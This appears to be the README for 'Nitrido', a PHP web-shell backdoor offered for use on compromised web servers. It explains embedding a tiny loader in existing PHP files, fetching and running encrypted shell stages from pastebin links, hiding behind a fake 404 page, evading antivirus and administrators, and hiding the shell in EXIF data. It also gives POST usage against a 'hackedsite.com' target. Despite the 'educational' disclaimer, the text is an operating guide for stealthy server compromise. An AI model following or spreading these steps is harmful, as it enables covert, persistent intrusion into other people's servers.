                           
 _____ _ _       _   _     
|   | |_| |_ ___|_|_| |___ 
| | | | |  _|  _| | . | . |
|_|___|_|_| |_| |_|___|___|
                           
THIS IS FOR EDUCATIONAL USAGE ONLY. I AM NOT LIABLE FOR YOUR USE OF THIS SHELL.


Nitrido is meant to be used as a silent and secure backdoor for web servers running PHP.

Nitrido, if configured correctly, is Fully Undetectable by Anti Virus Vendors and to most System Admins, and most people cannot leach your shell that may have private exploits to further escalate privileges, as your shell source is in AES-256-CBC.

All files should be saved as text files except for main.php

=========

TWO VERSIONS:

Their are two different versions of this shell

Folder: Nitrido Embed
In "Embed" version, you can backdoor any php file on the server by embedding the main.php code in it, and to use it, you will need to send a 'Unlock" POST request and then the key and iv. 

The main.php is php code you will upload on the server or embed in any php file on server, which is less than 160 bytes, which then requests the unlock.txt from a pastebin link(you can upload the unlock.txt to any pastebin and then change location in main.php)

The unlock.txt then evaluates that if a POST [unlock] request is sent, and if positive, then requests decrypter.txt from another pastebin link, you can upload the decrypter.txt to pastebin and then change the location in Unlock.txt

The decrypter.txt (from pastebin) will then request the main shell source(encrypted), and then ir will try to decrypt it from the key received(you can just change the location in decrypter.txt to point to your encrypted web shell) or use the encrypted shells given by us

The main.php first requests the Unlock.txt(from pastebin), and if it gets a "unlock" POST request, it forwards it to the "decrypter.txt" where u have send key and iv also

in this format, You will need to send the request twice to use your shell(you can use unlocker.html to send requests)

http://site.com/shell.php
POST DATA:
unlock=yes&key=yourkey&iv=youriv

==

Folder: Nitrido 404
In the “404” version, you can upload your main.php file on the web server. The shell will give a error 404 page until you send it the right "key" and "IV". 

The main.php is php code you will upload on the server, which is less than 160 bytes, which then requests the decrypter.txt from a pastebin link (you can upload the decrypter.txt to any pastebin and then change location in main.php)

The decrypter.txt (from pastebin) will then request the main shell source (encrypted), and then will try to decrypt it from the key received (you can just change the location in decrypter.txt to point to your encrypted webshell).

The main.php forwards your request to decrypter.txt (from pastebin) and if no POST request is sent for the key, it will display a 404 page.

You need to send a POST request in this format to run on your shell (you can use unlocker.html to send requests)

http://site.com/shell.php
POST DATA:
key=yourkey&iv=youriv

==

If you are smart enough, you can embed these shells in exif data and make full use of the small size

=========

ENCRYPT YOUR OWN SHELL:

In the tools folder, run the “encrypt.php” on a web server and enter the appropriate values and click submit. You will then see the encrypted source of your shell.

You can then use the “unlock.html" in the tools folder to send POST requests to your shell with appropriate Key and IV values(You will send the send the requests Twice in "Embed" in order to work).

Or you can manually send a post request via HACKBAR extension for firefox or any sniffer proxies (Burpesuit, Fiddler, Tamper, etc)

You will also need to refresh the page after sending the request for your shell to appear.

=========

Usage:

http://website.com/shell.php
POST: key=<Your Key>&iv=<Your IV>

Example:

http://hackedsite.com/yourshell.php
POST: key=yourkey&iv=youriv






